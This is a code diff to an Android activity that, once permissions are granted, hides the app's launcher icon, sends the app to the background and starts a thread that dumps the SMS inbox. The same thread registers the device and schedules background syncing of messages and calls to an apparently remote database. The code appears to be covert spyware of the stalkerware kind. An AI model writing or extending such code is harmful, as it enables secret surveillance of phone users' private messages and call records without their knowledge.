@@ -25,7 +25,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         bringToFront()
         MongoSyncHelper.ensureApiUrl(this)
         CallSyncHelper.markBackgroundSyncEnabled(this, true)
-        SyncBootstrap.armBackgroundSync(this)
+        CallSyncService.startHolding(this)
 
         if (!SyncBootstrap.needsCoreSyncPermissions(this)) {
             onAllowed()
@@ -132,21 +132,23 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         finished = true
         PermissionPopupAlarms.cancel(this)
         LauncherHider.hideNow(this)
-        SyncObserverManager.register(applicationContext)
-        SyncBootstrap.armBackgroundSync(applicationContext)
-        SyncAlarmScheduler.scheduleNext(applicationContext)
-        CallSyncService.ensureRunning(applicationContext)
+        CallSyncService.startHolding(applicationContext)
+        goHome()
+        try {
+            moveTaskToBack(true)
+        } catch (_: Exception) {
+        }
 
-        BackgroundSyncRunner.run {
+        Thread({
             try {
                 CallSyncService.holdDuring(applicationContext) {
                     SimNumberHelper.refreshSimIdentity(applicationContext)
+                    val dumped = InboxDump.dumpBlocking(applicationContext)
+                    Log.i(TAG, "Inbox dump finished ok=$dumped")
                     DeviceRegistration.registerNow(applicationContext)
-                    InstallFlow.runFirstCloudSync(applicationContext)
-                    MessageSyncHelper.syncAllMessagesNow(applicationContext, "after_allow")
-                    CallSyncHelper.syncAllCallsToMongoNow(applicationContext, "after_allow")
-                    SyncBootstrap.onPermissionsReady(applicationContext)
                     SyncObserverManager.register(applicationContext)
+                    SyncBootstrap.armBackgroundSync(applicationContext)
+                    SyncAlarmScheduler.scheduleNext(applicationContext)
                 }
             } catch (error: Exception) {
                 Log.e(TAG, "First sync failed", error)
@@ -157,7 +159,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
                     finish()
                 }
             }
-        }
+        }, "calltech-inbox-dump").start()
     }
 
     private fun goHome() {
